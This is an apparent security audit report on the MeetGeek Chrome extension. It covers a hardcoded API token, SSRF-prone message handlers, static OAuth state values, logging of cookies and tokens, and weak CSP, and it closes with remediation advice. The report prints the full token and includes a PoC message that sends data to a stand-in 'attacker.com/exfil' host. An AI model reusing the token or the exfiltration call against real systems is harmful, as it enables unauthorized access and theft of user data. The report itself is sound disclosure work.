# Vulnerability Report: MeetGeek AI Meeting Notes, Transcripts & Screen Recorder

**Extension ID:** `jgcndlaikgkhpbcekabcmnfeiaelgaon`
**Version:** 1.6.0
**Manifest Version:** 3
**Triage Flags:** V1=5, V2=2 (csp_unsafe_eval, csp_unsafe_inline, innerhtml_dynamic, dynamic_tab_url)
**Date:** 2026-02-06

---

## Executive Summary

Analysis of the MeetGeek Chrome extension reveals **5 verified vulnerabilities** ranging from Medium to High severity. The most critical findings are: (1) a hardcoded shared API authorization token embedded in all JavaScript bundles, (2) a background script SSRF/open-redirect via unvalidated message-driven fetch and tab creation, and (3) static OAuth state parameters enabling CSRF attacks against the authentication flow. Several triage flags (innerHTML, CSP) traced back to library code (React, Font Awesome) and are **false positives**.

**Overall Risk Assessment: MEDIUM-HIGH**

---

## Vulnerability 1: Hardcoded Shared API Authorization Token

**CVSS 3.1:** 7.5 (High)
**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`

**Files:**
- `background.bundle.js:463`
- `recorder.bundle.js:6966`
- `sidepanel.bundle.js:9504`
- `contentScript.bundle.js:11994`
- `content_transcript.bundle.js:822`

**Description:**
A static API authorization token is hardcoded in the extension configuration object and shipped in every JavaScript bundle:

```javascript
// background.bundle.js:463
token: "vpsQMTKpSzl9GghRmcUYrIUr9kvgrVdDuuLFeGzSnqvK3J52ZqN42rbOrBlmOEXdn8WcQ5brUEAT9aYDsmuNmXpEq4YNmDTQLZRDDPhxt5FBe7HrN4xNPFNULNtTbyr7"
```

This token is used as the `Authorization` header for all API calls to `app.meetgeek.ai` and `media.meetgeek.ai`:

```javascript
// background.bundle.js:5919
headers: { Authorization: n.token }

// background.bundle.js:6871
headers: { Authorization: n.token }

// background.bundle.js:6922
headers: { Authorization: n.token }
```

The token is identical across all bundles (production) with a different demo token in `content_transcript.bundle.js:822`. Since CRX files are publicly downloadable from the Chrome Web Store, any attacker can extract this token.

**PoC Exploit Scenario:**
1. Attacker downloads the extension CRX from the Chrome Web Store.
2. Extracts the token from any JS bundle.
3. Uses the token to make authenticated API calls to `https://app.meetgeek.ai/rp/api/mobile/*` endpoints (e.g., `get_upcoming_meetings`, `update_bot_join_state`, `mutation_observers`, `analyze`).
4. If the token is a shared secret (not per-user), the attacker can potentially access or manipulate other users' data. Even if the token serves as an API key for the extension (not per-user auth), its exposure violates defense-in-depth by allowing unauthenticated clients to reach backend endpoints.

**Impact:** Unauthorized API access. If this token grants access beyond public endpoints, it could enable data exfiltration of meeting recordings, transcripts, and user metadata.

---

## Vulnerability 2: Background Script SSRF via Unvalidated Message Handlers

**CVSS 3.1:** 6.5 (Medium)
**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N`

**Files:**
- `background.bundle.js:7752-7808` (`uploadMedia` and `requestAnalysis` handlers)
- `background.bundle.js:6693-6701` (`createRecorderWindow` handler)

**Description:**
The background service worker registers `chrome.runtime.onMessage` handlers that accept arbitrary URLs and authorization headers from any content script, then perform fetch requests or open windows to those URLs without validation.

**Handler 1 -- `uploadMedia` (line 7752):**
```javascript
return "uploadMedia" === e.action ? ((async () => {
  // ...
  const o = await fetch(e.url, {        // <-- attacker-controlled URL
    method: "POST",
    headers: {
      Authorization: e.authorization     // <-- attacker-controlled auth header
    },
    body: n,
    credentials: "include"               // <-- sends cookies!
  });
})(), !0)
```

**Handler 2 -- `requestAnalysis` (line 7785):**
```javascript
"requestAnalysis" === e.action ? ((async () => {
  const t = await fetch(e.url, {         // <-- attacker-controlled URL
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Authorization: e.authorization     // <-- attacker-controlled auth header
    },
    body: JSON.stringify(e.body),
    credentials: "include"
  });
})(), !0)
```

**Handler 3 -- `createRecorderWindow` (line 6693):**
```javascript
"createRecorderWindow" === e.action && chrome.windows.create({
  url: e.url,    // <-- attacker-controlled URL
  type: "popup",
  width: 400,
  height: 400,
  focused: !0
})
```

While `chrome.runtime.onMessage` only accepts messages from within the extension (content scripts, popup, sidepanel), the content scripts run on 18+ domains including `discord.com`, `*.slack.com`, `*.zoom.us`, `*.teams.microsoft.com`, etc. If any of these sites has an XSS vulnerability, an attacker could send messages via the injected content script to the background, triggering fetches to arbitrary URLs with the extension's network context and cookies.

Additionally, no callers for `uploadMedia` or `requestAnalysis` were found in any bundled JS, suggesting these are dead-code handlers that still accept and execute arbitrary requests -- expanding the attack surface unnecessarily.

**PoC Exploit Scenario:**
1. Attacker finds or exploits an XSS on `discord.com` (or any matched domain).
2. The XSS payload executes in the page context. While content scripts run in an isolated world, if the attacker can inject code that triggers the content script to relay a message (e.g., through DOM manipulation that the content script monitors), they can craft a `chrome.runtime.sendMessage` via the content script's context.
3. More directly: if an attacker compromises one of the content script pages (e.g., via a supply-chain attack on Discord/Slack), they can send:
   ```javascript
   chrome.runtime.sendMessage({
     action: "uploadMedia",
     url: "https://attacker.com/exfil",
     authorization: "Bearer stolen",
     blobData: "<base64 data>",
     fileName: "test.mp4",
     templateName: "test",
     languageCode: "en"
   });
   ```
4. The background script will POST to `attacker.com` with `credentials: "include"`, potentially leaking cookies for any domain the extension has host permissions on.

**Impact:** Server-Side Request Forgery from the extension's privileged background context. Potential cookie/credential exfiltration. Arbitrary window/tab opening for phishing.

---

## Vulnerability 3: Static OAuth State Parameter (CSRF in Authentication)

**CVSS 3.1:** 5.4 (Medium)
**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N`

**Files:**
- `sidepanel.bundle.js:21460` (Google OAuth)
- `sidepanel.bundle.js:21528` (Microsoft OAuth)

**Description:**
Both Google and Microsoft OAuth 2.0 authorization flows use hardcoded, non-random `state` parameters instead of cryptographically random nonces:

**Google OAuth (line 21460):**
```javascript
i = "https://accounts.google.com/o/oauth2/v2/auth?response_type=code&access_type=offline&client_id="
  + o + "&redirect_uri=" + encodeURIComponent("https://" + chrome.runtime.id + ".chromiumapp.org")
  + "&state=state_parameter_passthrough_value&scope=" + A  // <-- STATIC STATE
  + "&include_granted_scopes=true&prompt=select_account";
```

**Microsoft OAuth (line 21528):**
```javascript
s = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${o}
  &response_type=code
  &redirect_uri=${i}
  &approval_prompt=auto
  &scope=${A}
  &state=e7a2fc20f9573f7b3be37479030865   // <-- STATIC STATE
  &prompt=select_account`;
```

The `state` parameter in OAuth 2.0 is specifically designed to prevent CSRF attacks. When it is static (or predictable), an attacker can forge the callback URL.

**PoC Exploit Scenario:**
1. Attacker initiates an OAuth flow with MeetGeek, obtains their own auth code.
2. Attacker crafts a URL: `https://<extension-id>.chromiumapp.org?code=<attacker_code>&state=state_parameter_passthrough_value`
3. Victim is tricked into visiting this URL (or it is loaded via redirect).
4. The extension processes the attacker's auth code, potentially linking the victim's MeetGeek session to the attacker's Google/Microsoft account, or vice versa.

**Note:** In practice, `chrome.identity.launchWebAuthFlow` mitigates this somewhat since the redirect goes to `chromiumapp.org` which only the extension can capture. However, the static state still means the extension cannot verify that the response corresponds to a request it initiated, which is a protocol-level violation of RFC 6749 Section 10.12.

**Impact:** OAuth CSRF -- an attacker could potentially force a victim to authenticate with the attacker's account, enabling session fixation attacks where the attacker gains access to the victim's meeting recordings and transcripts.

---

## Vulnerability 4: Sensitive Data Logged to Console (Information Disclosure)

**CVSS 3.1:** 4.3 (Medium)
**Vector:** `CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N`

**Files:**
- `sidepanel.bundle.js:21468` -- OAuth authorization code logged
- `sidepanel.bundle.js:21504` -- Set-Cookie value logged
- `sidepanel.bundle.js:21516` -- Session cookie logged
- `sidepanel.bundle.js:21537` -- Microsoft auth code logged
- `sidepanel.bundle.js:21573` -- Set-Cookie value logged
- `sidepanel.bundle.js:21574` -- Session cookie from getCookie endpoint logged
- `sidepanel.bundle.js:21581` -- OAuth tokens logged
- `background.bundle.js:7244-7246` -- Set-Cookie headers from ALL URLs logged

**Description:**
The extension logs highly sensitive authentication material to the browser console in production:

```javascript
// sidepanel.bundle.js:21468 -- Google OAuth authorization code
console.log("code:", o)

// sidepanel.bundle.js:21504 -- Session cookie value
console.log("Captured Set-Cookie value on manifest v3:", o)

// sidepanel.bundle.js:21516 -- Cookie after auth
console.log("cookie", t)

// sidepanel.bundle.js:21537 -- Microsoft OAuth authorization code
console.log("code", decodeURIComponent(r))

// sidepanel.bundle.js:21573 -- Set-Cookie header value
console.log("Captured Set-Cookie value:", r)

// sidepanel.bundle.js:21581 -- OAuth tokens
console.log("tokens", t)
```

Additionally, the background script logs Set-Cookie headers for ALL browsed URLs:

```javascript
// background.bundle.js:7244-7246
chrome.webRequest.onHeadersReceived.addListener((function(e) {
  if (e.responseHeaders)
    for (const t of e.responseHeaders)
      "set-cookie" === t.name.toLowerCase() &&
        console.log("[onHeadersReceived] Set-Cookie header:", t.value)
}), {
  urls: ["<all_urls>"],
  types: ["main_frame"]
}, ["responseHeaders", "extraHeaders"])
```

**PoC Exploit Scenario:**
1. Any extension or DevTools script with access to the console output (or `console.log` interception) can read OAuth codes, session cookies, and Set-Cookie headers.
2. On shared/kiosk machines, opening DevTools reveals session tokens from previous authentication flows.
3. The `<all_urls>` webRequest listener logs Set-Cookie headers from every site the user visits, not just MeetGeek domains. This is a privacy violation -- if another extension or tool captures console output, all session cookies from all sites are exposed.

**Impact:** Exposure of OAuth authorization codes, session cookies, and authentication tokens. On shared systems or when combined with other vulnerabilities, this enables session hijacking.

---

## Vulnerability 5: CSP `unsafe-inline` on Extension Side Panel Page

**CVSS 3.1:** 4.0 (Medium)
**Vector:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N`

**File:**
- `sidepanel.html:1`

**Description:**
The side panel HTML page includes a meta CSP tag that allows `unsafe-inline` for scripts:

```html
<meta http-equiv="Content-Security-Policy"
  content="script-src 'self' 'unsafe-inline' https://apis.google.com/js/api.js"/>
```

This weakens the Content Security Policy by allowing inline script execution. In the extension's manifest, the `extension_pages` CSP is properly set to `script-src 'self'`, but this HTML-level meta tag overrides it for the sidepanel page specifically.

Additionally, the manifest's `sandbox` CSP allows both `unsafe-inline` and `unsafe-eval`:
```json
"sandbox": "sandbox allow-scripts allow-forms allow-popups allow-modals;
  script-src 'self' 'unsafe-inline' 'unsafe-eval';
  child-src 'self';
  script-src-elem 'self' https://maps.googleapis.com"
```

**PoC Exploit Scenario:**
1. If an attacker finds an injection point in the sidepanel (e.g., via a stored XSS in meeting data returned from the API, or via the `t.url` / `t.title` / `t.owner.name` fields rendered in the meeting list), the `unsafe-inline` CSP allows the injected script to execute.
2. The sidepanel runs in the extension context with access to `chrome.runtime`, `chrome.storage`, and other extension APIs.
3. Combined with Vulnerability 4 (console logging), any inline script could intercept sensitive data.

**Impact:** Reduced XSS defense for the side panel page. If combined with an injection vector (e.g., malicious meeting title from the API), this enables code execution in the extension context.

---

## False Positive Analysis

The following triage flags were investigated and determined to be **false positives**:

| Flag | Finding | Verdict |
|------|---------|---------|
| `innerhtml_dynamic` | All `innerHTML` usages trace to React runtime (SVG namespace handling), Font Awesome library (icon rendering), react-draggable (style injection), and static HTML string literals in content_transcript.bundle.js | **FALSE POSITIVE** -- Library code, not app-level dynamic injection |
| `csp_unsafe_eval` | Only present in the manifest `sandbox` CSP, not in `extension_pages` | **LOW RISK** -- Sandbox pages are isolated by design; no sandbox HTML pages were found in the extension |
| `dynamic_tab_url` | `chrome.tabs.create({url: e.url})` at background.bundle.js:7422 -- the URL comes from `chrome.runtime.getURL("screen-recorder.html")` in the content script caller | **FALSE POSITIVE** for the `createAndPinRecorderTab` path; **TRUE POSITIVE** for `createRecorderWindow` at line 6693 (covered in Vuln 2) |

---

## Permissions Review

| Permission | Justification | Risk |
|------------|---------------|------|
| `sidePanel` | Core UI functionality | Low |
| `identity` | OAuth login flows | Low |
| `cookies` | Session management | Medium -- broad access |
| `tabs` | Tab management for recorder | Medium |
| `webRequest` | Cookie capture during OAuth; also logs ALL Set-Cookie headers | **High** -- overly broad |
| `storage` | State persistence | Low |
| `desktopCapture` | Screen recording | Medium -- expected |
| `downloads` | Saving recordings | Low |
| `windows` | Recorder window management | Low |
| `scripting` | Inject CSS/JS into Google Meet PiP | Medium |

**Host Permissions:** The extension has host permissions for 18+ domains including Google Meet, Zoom, Teams, Discord, Slack, Webex, Jitsi, Whereby, Miro, and BetterUp. Content scripts are injected into all these domains.

**Web-Accessible Resources:** `screen-recorder.html`, `recorder.bundle.js`, `content.styles.css`, SVG assets, and `silence_audio.mp4` are accessible from `<all_urls>`. This enables extension fingerprinting -- any website can probe for these resources to detect if MeetGeek is installed.

---

## Recommendations

1. **Rotate and move API token server-side.** Replace the hardcoded shared token with per-user authentication tokens obtained after login. The current token should be rotated immediately as it is publicly exposed.
2. **Validate URLs in message handlers.** Add allowlist validation to `uploadMedia`, `requestAnalysis`, and `createRecorderWindow` handlers to only accept URLs matching `*.meetgeek.ai` domains. Remove dead-code handlers that have no callers.
3. **Generate random OAuth state parameters.** Use `crypto.getRandomValues()` to generate a unique state nonce per authentication attempt and verify it on callback.
4. **Remove all console.log statements logging sensitive data** in production builds. Remove the `<all_urls>` webRequest listener that logs Set-Cookie headers.
5. **Remove `unsafe-inline` from sidepanel.html CSP.** Use nonce-based or hash-based CSP for any required inline scripts.
6. **Restrict `web_accessible_resources`** to only the specific domains that need them, rather than `<all_urls>`.
